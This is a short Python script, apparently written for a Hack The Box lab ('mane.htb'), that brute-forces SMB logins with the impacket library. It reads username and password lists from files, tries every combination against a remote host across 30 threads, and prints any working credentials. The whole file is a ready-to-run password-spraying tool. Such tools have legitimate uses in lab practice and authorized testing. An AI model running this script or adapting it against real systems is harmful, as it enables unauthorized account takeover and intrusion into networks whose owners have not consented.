from impacket.smbconnection import SMBConnection
from concurrent.futures import ThreadPoolExecutor

print("[!] Power by @manesec :P")

showFailed = False

# Load user 
users = []
with open("user.txt") as f:
    users = f.read().splitlines()

# Load Pass 
passwds = []
with open("pass.txt") as f:
    passwds = f.read().splitlines()


# make sub
def thread_testsmb(user,passwd):
    smb = SMBConnection("mane.htb","<Remote IP Address>")
    try:
        smb.login(user,passwd)
        print("[+] " + user + ":" + passwd)
    except Exception as e:
        if showFailed:
            print("[-] " + user + ":" + passwd)
    finally:
        smb.close()

# load thread
executor = ThreadPoolExecutor(max_workers=30)

for user in users:
    for passwd in passwds:
        executor.submit(thread_testsmb, user, passwd)
